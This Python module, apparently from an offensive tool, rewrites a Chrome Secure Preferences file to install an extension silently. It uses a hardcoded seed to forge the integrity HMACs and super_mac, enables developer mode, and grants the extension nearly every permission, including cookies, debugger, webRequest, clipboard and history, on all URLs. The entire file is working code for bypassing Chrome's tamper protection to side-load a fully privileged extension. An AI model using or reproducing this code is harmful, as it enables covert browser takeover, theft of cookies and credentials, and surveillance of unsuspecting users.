import hmac
import json
import hashlib
from .utils import log

def remove_empty(d):
    if isinstance(d, dict):
        return {k: remove_empty(v) for k, v in d.items() if v or v in [False, 0]}
    elif isinstance(d, list):
        return [remove_empty(v) for v in d if v or v in [False, 0]]
    else:
        return d

def calculate_hmac(value_as_string, path, sid, seed):
    if isinstance(value_as_string, dict):
        remove_empty(value_as_string)
    
    json_value = json.dumps(value_as_string, separators=(',', ':'), ensure_ascii=False)
    json_value = json_value.replace('<', '\\u003C').replace('\\u2122', '™')
    
    message = sid + path + json_value
    hash_obj = hmac.new(seed, message.encode("utf-8"), hashlib.sha256)
    return hash_obj.hexdigest().upper()

def calc_supermac(data, sid, seed):
    super_msg = sid + json.dumps(data['protection']['macs'], separators=(',', ':'))
    hash_obj = hmac.new(seed, super_msg.encode("utf-8"), hashlib.sha256)
    return hash_obj.hexdigest().upper()

def update_secure_preferences(secure_prefs, absolute_extension_path, target_sid, manifest_content):
    log.debug(f"Updating Secure Preferences for user with SID: {target_sid}")
    log.debug(f"Extension path: {absolute_extension_path}")
    log.debug(f"Manifest content: {manifest_content[:50]}...")  # Truncated for brevity

    extension_id = "cnafodmengkjclnldejcdlpghbjbilgo"
    seed = b'\xe7H\xf36\xd8^\xa5\xf9\xdc\xdf%\xd8\xf3G\xa6[L\xdffv\x00\xf0-\xf6rJ*\xf1\x8a!-&\xb7\x88\xa2P\x86\x91\x0c\xf3\xa9\x03\x13ihq\xf3\xdc\x05\x8270\xc9\x1d\xf8\xba\\O\xd9\xc8\x84\xb5\x05\xa8'

    log.debug(f"Using seed: {seed}")

    data = json.loads(secure_prefs)

    # Add developer mode setting (Chrome v134+)
    if "extensions" not in data:
        data["extensions"] = {"settings": {}}
    elif "ui" not in data["extensions"]:
        data["extensions"]["ui"] = {}
    data["extensions"]["ui"]["developer_mode"] = True

    extension_json = {
        "active_permissions": {
            "api": [
                "activeTab", "alarms", "background", "bookmarks", "browsingData", "clipboardRead", "clipboardWrite",
                "contentSettings", "contextMenus", "cookies", "debugger", "declarativeContent", "desktopCapture",
                "downloads", "fontSettings", "gcm", "geolocation", "history", "identity", "idle", "management",
                "nativeMessaging", "notifications", "pageCapture", "power", "printerProvider", "privacy", "proxy",
                "sessions", "storage", "system.display", "system.storage", "tabs", "tabCapture", "topSites", "tts",
                "ttsEngine", "unlimitedStorage", "webNavigation", "webRequest", "system.cpu", "system.memory",
                "declarativeNetRequest", "declarativeNetRequestFeedback", "search", "tabGroups", "scripting",
                "declarativeNetRequestWithHostAccess"
            ],
            "explicit_host": ["<all_urls>"],
            "manifest_permissions": [],
            "scriptable_host": ["<all_urls>"]
        },
        "commands": {},
        "content_settings": [],
        "creation_flags": 38,
        "from_webstore": False,
        "granted_permissions": {
            "api": [
                "activeTab", "alarms", "background", "bookmarks", "browsingData", "clipboardRead", "clipboardWrite",
                "contentSettings", "contextMenus", "cookies", "debugger", "declarativeContent", "desktopCapture",
                "downloads", "fontSettings", "gcm", "geolocation", "history", "identity", "idle", "management",
                "nativeMessaging", "notifications", "pageCapture", "power", "printerProvider", "privacy", "proxy",
                "sessions", "storage", "system.display", "system.storage", "tabs", "tabCapture", "topSites", "tts",
                "ttsEngine", "unlimitedStorage", "webNavigation", "webRequest", "system.cpu", "system.memory",
                "declarativeNetRequest", "declarativeNetRequestFeedback", "search", "tabGroups", "scripting",
                "declarativeNetRequestWithHostAccess"
            ],
            "explicit_host": ["<all_urls>"],
            "manifest_permissions": [],
            "scriptable_host": ["<all_urls>"]
        },
        "incognito_content_settings": [],
        "incognito_preferences": {},
        "location": 4,
        "newAllowFileAccess": True,
        "path": absolute_extension_path,
        "preferences": {},
        "regular_only_preferences": {},
        "service_worker_registration_info": {
            "version": "24.6.1.2"
        },
        "serviceworkerevents": [
            "tabs.onActivated",
            "tabs.onUpdated",
            "webRequest.onBeforeRequest/s1"
        ],
        "state": 1,
        "was_installed_by_default": False,
        "was_installed_by_oem": False,
        "withholding_permissions": False
    }

    # Update extension details from manifest
    try:
        manifest = json.loads(manifest_content)
        extension_json['version'] = manifest.get('version', '1.0')
    except json.JSONDecodeError:
        log.error("Failed to parse manifest.json")
        return None

    data["extensions"]["settings"][extension_id] = extension_json

    # Calculate extension HMAC
    path = f"extensions.settings.{extension_id}"
    macs = calculate_hmac(extension_json, path, target_sid, seed)
    log.debug(f"Extension JSON: {json.dumps(extension_json, indent=2)}")
    log.debug(f"Path: {path}")
    log.debug(f"User SID: {target_sid}")
    log.debug(f"Calculated HMAC: {macs}")
    data["protection"]["macs"]["extensions"]["settings"][extension_id] = macs
    
    # Calculate developer mode HMAC (Chrome v134+)
    if "ui" not in data["protection"]:
        data["protection"]["ui"] = {}
    dev_mode_path = "extensions.ui.developer_mode"
    dev_mode_mac = calculate_hmac(True, dev_mode_path, target_sid, seed)
    log.debug(f"Developer mode path: {dev_mode_path}")
    log.debug(f"Calculated developer mode HMAC: {dev_mode_mac}")
    data["protection"]["ui"]["developer_mode"] = dev_mode_mac
    
    # Calculate supermac
    supermac = calc_supermac(data, target_sid, seed)
    
    log.debug(f"Calculated Supermac: {supermac}")
    data["protection"]["super_mac"] = supermac

    return json.dumps(data, ensure_ascii=False)